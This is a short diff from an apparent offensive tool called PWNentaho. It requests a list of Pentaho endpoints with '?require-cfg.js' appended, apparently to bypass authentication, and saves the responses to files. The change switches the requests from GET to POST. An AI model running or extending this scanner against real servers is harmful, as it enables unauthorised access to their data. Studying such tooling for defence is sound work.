@@ -20,7 +20,7 @@ class PWNentaho:
             endpoints = self._read_endpoints()
             for endpoint in tqdm(endpoints):
                 try:
-                    response = requests.get(f"{target}/{endpoint}?require-cfg.js", timeout=5)
+                    response = requests.post(f"{target}/{endpoint}?require-cfg.js", timeout=5)
                     response.raise_for_status()
                     filename = self._extract_filename(endpoint) + ".txt"
                     with open(f"outputs/{filename}", "w") as f:
